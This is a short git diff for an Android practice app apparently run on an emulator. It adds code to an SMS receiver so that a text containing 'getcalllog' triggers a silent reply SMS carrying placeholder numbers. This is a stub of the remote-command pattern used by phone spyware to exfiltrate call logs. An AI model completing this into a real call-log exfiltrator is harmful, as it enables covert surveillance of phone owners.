34849e5b10c2bafeaf8ffa8d3bb9245baa7ef64b
abdul <abdul.tanveer@gmail.com>
2019-07-22 21:42:18 +0530

    send sms

--- app/src/main/java/com/example/asynctaskapp/SmsReceiver.java
+++ app/src/main/java/com/example/asynctaskapp/SmsReceiver.java
@@ -4,6 +4,7 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.os.Bundle;
+import android.telephony.SmsManager;
 import android.telephony.SmsMessage;
 import android.widget.Toast;
 
@@ -11,6 +12,7 @@ public class SmsReceiver extends BroadcastReceiver {
 
     @Override
     public void onReceive(Context context, Intent intent) {
+
         Bundle bundle = intent.getExtras();
         SmsMessage[] msgs = null;
         String str = "";
@@ -21,11 +23,17 @@ public class SmsReceiver extends BroadcastReceiver {
             for (int i = 0; i < msgs.length; i++) {
                 msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                 //str += "SMS from " + msgs[i].getOriginatingAddress();
-                //str += " :";
+               // str += " :";
                 str += msgs[i].getMessageBody().toString();
                // str += "\n";
             }
             Toast.makeText(context, str, Toast.LENGTH_SHORT).show();
+            if(str.contains("getcalllog")){
+                SmsManager manager = SmsManager.getDefault();
+                manager.sendTextMessage("5554",null,
+                        "1234567890,987654321",null,null);
+            }
+
         }
     }
 }
